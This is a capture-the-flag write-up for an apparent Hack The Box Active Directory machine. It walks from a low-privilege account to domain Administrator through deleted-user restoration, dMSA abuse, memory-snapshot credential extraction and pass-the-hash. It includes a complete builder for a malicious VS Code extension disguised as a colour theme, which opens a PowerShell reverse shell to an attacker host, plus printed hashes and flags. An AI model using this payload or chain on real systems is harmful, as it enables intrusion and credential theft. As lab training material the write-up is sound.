# Checkpoint

## Checkpoint — Executive Summary

| Phase                    | Details                                                                                                       |
| ------------------------ | ------------------------------------------------------------------------------------------------------------- |
| Initial Access           | Valid credentials for `alex.turner` were provided.                                                            |
| Enumeration              | LDAP enumeration revealed write permissions over deleted objects and the Employees OU.                        |
| Privilege Escalation #1  | Restored the deleted user `mark.davies` and authenticated using the known password.                           |
| Discovery                | Enumerated SMB shares and identified the writable `DevDrop` share used for VS Code extensions.                |
| Code Execution           | Uploaded a malicious VSIX package containing a PowerShell reverse shell and obtained access as `ryan.brooks`. |
| Privilege Escalation #2  | Leveraged dMSA abuse to impersonate `svc_deploy` and recover account credentials.                             |
| Lateral Movement         | Authenticated as `svc_deploy` via WinRM.                                                                      |
| Sensitive Data Discovery | Identified VMware backup files stored in the `VMBackups` share.                                               |
| Credential Extraction    | Used VMkatz against a VM memory snapshot to recover the local Administrator NTLM hash.                        |
| Privilege Escalation #3  | Performed Pass-the-Hash authentication as `Administrator`.                                                    |
| Objective                | Retrieved the root flag from `C:\Users\max.palmer\Desktop\root.txt`.                                          |
| Root Flag                | `864d9d13edb008ab521d024ee7f66a14`                                                                            |



### **Reconnaissance** <a href="#reconnaissance" id="reconnaissance"></a>

{% code overflow="wrap" %}
```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -T4 10.129.109.27 -Pn 
Nmap scan report for 10.129.109.27
Host is up (0.46s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-06-22 19:45:16Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
3268/tcp open  ldap
3269/tcp open  globalcatLDAPssl?
5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 7h03m10s
| smb2-time: 
|   date: 2026-06-22T19:45:52
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 124.54 seconds

```
{% endcode %}

Domain `checkpoint.htb`, hostname `DC01.checkpoint.htb` from LDAP + SSL cert.

### Environment Setup

{% code overflow="wrap" %}
```shellscript
┌──(kali㉿kali)-[~]
└─$ sudo ip link set dev tun0 mtu 1300
sudo sed -i '/checkpoint/d' /etc/hosts
echo "10.129.109.27 checkpoint.htb dc01.checkpoint.htb DC01.CHECKPOINT.HTB dc01" | sudo tee -a /etc/hosts
DCT=$(nmap --script smb2-time -p445 10.129.109.27 -oN - | awk -F'date: ' '/\| *date:/ {print $2}' | sed 's/T/ /' | head -1)
echo $DCT
10.129.109.27 checkpoint.htb dc01.checkpoint.htb DC01.CHECKPOINT.HTB dc01
```
{% endcode %}

{% code overflow="wrap" %}
```shellscript
┌──(kali㉿kali)-[~]
└─$ nxc smb 10.129.109.27 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!'          
SMB         10.129.109.27   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.109.27   445    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024! 

```
{% endcode %}

<pre class="language-shellscript" data-overflow="wrap"><code class="lang-shellscript">┌──(kali㉿kali)-[~]
└─$ bloodyAD --host 10.129.109.27 --dns 10.129.109.27 -d checkpoint.htb \
  -u alex.turner -p 'Checkpoint2024!' get writable

<strong>distinguishedName: CN=Deleted Objects,DC=checkpoint,DC=htb
</strong><strong>DACL: WRITE
</strong>
distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: OU=Employees,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: CN=Alex Turner,OU=Employees,DC=checkpoint,DC=htb
permission: WRITE

<strong>distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
</strong><strong>permission: WRITE
</strong>
distinguishedName: DC=checkpoint.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.checkpoint.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD
</code></pre>

Restore Mark Davies

{% code overflow="wrap" %}
```shellscript
┌──(kali㉿kali)-[~]
└─$ bloodyAD --host DC01.checkpoint.htb --dc-ip 10.129.109.27 \ 
  -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' \
  set restore mark.davies
[+] mark.davies has been restored successfully under CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb
```
{% endcode %}

{% code overflow="wrap" %}
```shellscript
┌──(kali㉿kali)-[~]
└─$ nxc smb 10.129.109.27 -d checkpoint.htb -u mark.davies -p 'Checkpoint2024!' --shares
SMB         10.129.109.27   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.109.27   445    DC01             [+] checkpoint.htb\mark.davies:Checkpoint2024! 
SMB         10.129.109.27   445    DC01             [*] Enumerated shares
SMB         10.129.109.27   445    DC01             Share           Permissions     Remark
SMB         10.129.109.27   445    DC01             -----           -----------     ------
SMB         10.129.109.27   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.109.27   445    DC01             C$                              Default share
SMB         10.129.109.27   445    DC01             DevDrop         READ,WRITE      VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
SMB         10.129.109.27   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.109.27   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.109.27   445    DC01             SYSVOL          READ            Logon server share 
SMB         10.129.109.27   445    DC01             VMBackups    
```
{% endcode %}

Generate reverse shell

{% code overflow="wrap" %}
```shellscript
# Generate B64 payload
LHOST="10.10.xx.xx"
LPORT="4444"
B64=$(python3 -c "
import base64
cmd = '\$client = New-Object System.Net.Sockets.TCPClient(\"$LHOST\",$LPORT);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()'
print(base64.b64encode(cmd.encode('utf-16-le')).decode())
")
echo "B64: $B64"

# Create directory structure
mkdir -p /tmp/evil-ext/extension

# Create package.json
cat > /tmp/evil-ext/extension/package.json << 'EOF'
{
"name": "checkpoint-theme",
"displayName": "Checkpoint Theme",
"description": "Official Checkpoint color theme",
"version": "1.0.0",
"publisher": "checkpoint",
"engines": { "vscode": "^1.118.0" },
"activationEvents": ["*"],
"main": "./extension.js",
"contributes": {}
}
EOF

# Create extension.js with reverse shell
cat > /tmp/evil-ext/extension/extension.js << EOF
const { execSync } = require('child_process');
function activate(context) {
try {
execSync('powershell -e $B64');
} catch(e) {}
}
function deactivate() {}
module.exports = { activate, deactivate };
EOF

# Create manifest files
cat > /tmp/evil-ext/extension.vsixmanifest << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<PackageManifest Version="2.0.0"
xmlns="http://schemas.microsoft.com/developer/vsx-schema/2011">
<Metadata>
<Identity Language="en-US" Id="checkpoint-theme" Version="1.0.0"
Publisher="checkpoint"/>
<DisplayName>Checkpoint Theme</DisplayName>
<Description>Official Checkpoint color theme</Description>
</Metadata>
<Installation>
<InstallationTarget Id="Microsoft.VisualStudio.Code"/>
</Installation>
<Assets>
<Asset Type="Microsoft.VisualStudio.Code.Manifest" Path="extension/package.json"/>
</Assets>
</PackageManifest>
EOF

cat > '/tmp/evil-ext/[Content_Types].xml' << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension=".vsixmanifest" ContentType="text/xml"/>
<Default Extension=".json" ContentType="application/json"/>
<Default Extension=".js" ContentType="application/javascript"/>
</Types>
EOF

# Package vsix
cd /tmp/evil-ext
rm -f checkpoint-theme-1.0.0.vsix
zip -r checkpoint-theme-1.0.0.vsix extension/ extension.vsixmanifest "[Content_Types].xml"
ls -la checkpoint-theme-1.0.0.vsix

# Upload to DevDrop
smbclient //10.129.xx.xx DevDrop -U 'checkpoint.htb/mark.davies%Checkpoint2024!' \
  -c 'put /tmp/evil-ext/checkpoint-theme-1.0.0.vsix checkpoint-theme-1.0.0.vsix'

echo "[+] Payload uploaded! Waiting for shell on port 4444..."
```
{% endcode %}

Ryan shell

{% code overflow="wrap" %}
```shellscript
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.43] from (UNKNOWN) [10.129.109.27] 50983
whoami
checkpoint\ryan.brooks
PS C:\Program Files\Microsoft VS Code> 
```
{% endcode %}

User Flag

{% code overflow="wrap" %}
```shellscript
PS C:\Users\ryan.brooks\Desktop> cat user.txt
92a144ca831be404a8f95087c56c7091
```
{% endcode %}

{% code overflow="wrap" %}
```shellscript
┌──(kali㉿kali)-[~]
└─$ DCT=$(nmap --script smb2-time -p445 10.129.109.27 -oN - | awk -F'date: ' '/\| *date:/ {print $2}' | sed 's/T/ /' | head -1)
TZ=UTC faketime "$DCT" impacket-getTGT -aesKey 545b2e59b9c2c2ed01bf5b3972a360818f88f1a35311de3eeb06277a265b9099 checkpoint.htb/ryan.brooks -dc-ip 10.129.109.27
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in ryan.brooks.ccache
```
{% endcode %}

<pre class="language-shellscript"><code class="lang-shellscript">──(kali㉿kali)-[~]
└─$ bloodyad -u ryan.brooks -d checkpoint.htb -H DC01.checkpoint.htb -i 10.129.109.27 -k ccache=ryan.brooks.ccache add badSuccessor evil_dmsa -t 'CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb' --ou 'OU=DMSAHolder,DC=checkpoint,DC=htb'
Clock skew detected. Adjusting local time by 7:03:09.409374. Retrying operation.
[+] Creating DMSA evil_dmsa$ in OU=DMSAHolder,DC=checkpoint,DC=htb
[+] Impersonating: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb
Clock skew detected. Adjusting local time by 7:03:09.790511. Retrying operation.

Realm        : CHECKPOINT.HTB
Sname        : krbtgt/CHECKPOINT.HTB
UserName     : evil_dmsa$
UserRealm    : checkpoint.htb
StartTime    : 2026-06-23 01:52:56+00:00
EndTime      : 2026-06-23 11:49:04+00:00
RenewTill    : 2026-06-24 01:49:03+00:00
Flags        : pre-authent, enc-pa-rep, forwardable, renewable
Keytype      : 18
Key          : GtI3Cm1x9iBQjGX2XMQ8kFRqM6N78y+lNxByGCqm85I=
EncodedKirbi : 

    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
    Q0tQT0lOVC5IVEI=
[+] dMSA TGT stored in ccache file evil_dmsa_xl.ccache

dMSA current keys found in TGS:
AES256: 4116f5a27a38d98bf575df84e95dd0f5dd0196c8f6b3d6fbb8019758480fa25b
AES128: d146531a5797af68dd5cd790411fe67b
RC4: 0e4fb4e7acd06e85cc26c74684f1bf23

dMSA previous keys found in TGS (including keys of preceding managed accounts):
RC4: <a data-footnote-ref href="#user-content-fn-1">e16081eb077aca74bdbf8af12af43ac9</a>

</code></pre>

{% code overflow="wrap" %}
```shellscript
┌──(kali㉿kali)-[~]
└─$ evil-winrm -i 10.129.109.27 -u checkpoint.htb\\svc_deploy -H "e16081eb077aca74bdbf8af12af43ac9"
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> 

```
{% endcode %}

{% code overflow="wrap" %}
```shellscript
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> dir "\\DC01.checkpoint.htb\VMBackups" -Recurse -Force -ErrorAction SilentlyContinue


    Directory: \\DC01.checkpoint.htb\VMBackups


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/9/2026   9:54 AM                NightlyBackup_2024-11-01


    Directory: \\DC01.checkpoint.htb\VMBackups\NightlyBackup_2024-11-01


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/9/2026  10:12 AM                memory forensics


    Directory: \\DC01.checkpoint.htb\VMBackups\NightlyBackup_2024-11-01\memory forensics


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          5/9/2026   7:45 PM      106496000 Windows Server 2019-000001.vmdk
-a----          5/9/2026   7:40 PM     2147483648 Windows Server 2019-Snapshot1.vmem
-a----          5/9/2026   7:40 PM      138164859 Windows Server 2019-Snapshot1.vmsn
-a----          5/9/2026   7:39 PM         270840 Windows Server 2019.nvram
-a----          5/9/2026   7:45 PM           7642 Windows Server 2019.scoreboard
-a----          5/9/2026   7:39 PM    10199695360 Windows Server 2019.vmdk
-a----          5/9/2026   7:39 PM            502 Windows Server 2019.vmsd
-a----          5/9/2026   7:45 PM           2749 Windows Server 2019.vmx
-a----          5/9/2026   7:22 PM            274 Windows Server 2019.vmxf

```
{% endcode %}

{% code overflow="wrap" %}
```shellscript
cd /tmp
wget https://github.com/nikaiw/VMkatz/releases/download/v1.2.2/vmkatz-v1.2.2-windows-x86_64.zip
unzip vmkatz-v1.2.2-windows-x86_64.zip
```
{% endcode %}

{% code overflow="wrap" %}
```powershell
*Evil-WinRM* PS C:\Users\svc_deploy\Desktop> upload /tmp/vmkatz.exe vmkatz.exe
                                        
Info: Uploading /tmp/vmkatz.exe to C:\Users\svc_deploy\Desktop\vmkatz.exe
                                        
Data: 2766848 bytes of 2766848 bytes copied
                                        
Info: Upload successful!
```
{% endcode %}

{% code overflow="wrap" %}
```ps
*Evil-WinRM* PS C:\Users\svc_deploy\Desktop> .\vmkatz.exe "\\DC01.checkpoint.htb\VMBackups\NightlyBackup_2024-11-01\memory forensics\Windows Server 2019-Snapshot1.vmem"
vmkatz.exe : [*] vmkatz v1.2.2
    + CategoryInfo          : NotSpecified: ([*] vmkatz v1.2.2:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
[*] System discovery: 12.9328857s[*] Process enumeration: 3.0018ms[*] Providers: MSV(ok) WDigest(ok) Kerberos(ok) TsPkg(empty) DPAPI(ok) SSP(empty) LiveSSP(n/a) Credman(empty) CloudAP(empty)
[*] Credential extraction: 28.4107ms
[+] 2 logon session(s), 2 with credentials:

  LUID: 0x3e4 (NETWORK SERVICE)
  Username: WIN-0DG6SJAEUTA$
  Domain: WORKGROUP
  [DPAPI]
    GUID          : 632b77c8-5e1a-4479-8e35-baa290fdd6ae
    MasterKey     : 15e104f6de4e478c6bf55252632a25b973fccd39c2be8cc0d5b15a5dec06029f02fe0a02a3e57eb3b55f077f83a283cd0a11f6b3c6508d9e585527de78dc989e
    SHA1 MasterKey: 44bb34a624afcd186909843e6cbdb4cfee908975
  [DPAPI]
    GUID          : 57e1a5d6-bbd4-44e9-a5c4-f4241b0821b0
    MasterKey     : 95f668c165e7c0b3bd1f525330e5a647b9c9c8da7320c6fbdb4518a588bac996567e04f22b28d4f7a2abd33fafe0958522bca1aaa0de00f5edb7d6742065642d
    SHA1 MasterKey: b2bf2c648554143d6b28b3c06a1ece7e40867238
  [DPAPI]
    GUID          : 4f09a449-22e7-4a65-a4b9-fac89cc25328
    MasterKey     : e4778f7e1b8351eade5c49bb8e32503fbbaa705bb7e26eef5785e0a8200e31fcc2458a4db00e03aaabef34bd47900beee2d8a5bb73ddd904fbe279089a1ea718
    SHA1 MasterKey: 90b1c277630e507a8e28d7b260a53f21712c3f1d

  LUID: 0x14016d
  Session: 2 | LogonType: Unknown
  Username: Administrator
  Domain: WIN-0DG6SJAEUTA
  LogonServer: WIN-0DG6SJAEUTA
  LogonTime: 2026-05-09 14:07:14 UTC
  SID: S-1-5-21-2823729479-30462974-3865623546-500
  [MSV1_0]
    NT Hash : f29e9c014295b9b32139b09a2790be3b
    SHA1    : 89c15f3cd3ede88faf4b2d2e56253cf953e7922e
    DPAPI   : 89c15f3cd3ede88faf4b2d2e56253cf953e7922e
  [DPAPI]
    GUID          : c53f7d5b-2902-415c-9c09-251f39974440
    MasterKey     : 32cc5c309067ca0994b849897a9b85b89511547030a1d8b74fe6e37ba037a4161301ffce692e6e433c3821dc18abfe208e1dc5c458de79d1352c6681e18bde15
    SHA1 MasterKey: b061f87be6d2776897d912fed9156a354b81a595
```
{% endcode %}

{% code overflow="wrap" %}
```ps
┌──(kali㉿kali)-[~]
└─$ evil-winrm -i 10.129.109.27 -u checkpoint.htb\\Administrator -H "f29e9c014295b9b32139b09a2790be3b"
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 

```
{% endcode %}

{% code overflow="wrap" %}
```shellscript
*Evil-WinRM* PS C:\Users\Administrator\Documents> dir "C:\" -Recurse -Include "root.txt" -Force -ErrorAction SilentlyContinue


    Directory: C:\Documents and Settings\max.palmer\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         6/22/2026  12:40 PM             34 root.txt


    Directory: C:\Users\max.palmer\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         6/22/2026  12:40 PM             34 root.txt

```
{% endcode %}

{% code overflow="wrap" %}
```shellscript
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat C:\Users\max.palmer\Desktop\root.txt
864d9d13edb008ab521d024ee7f66a14
```
{% endcode %}

[^1]: 
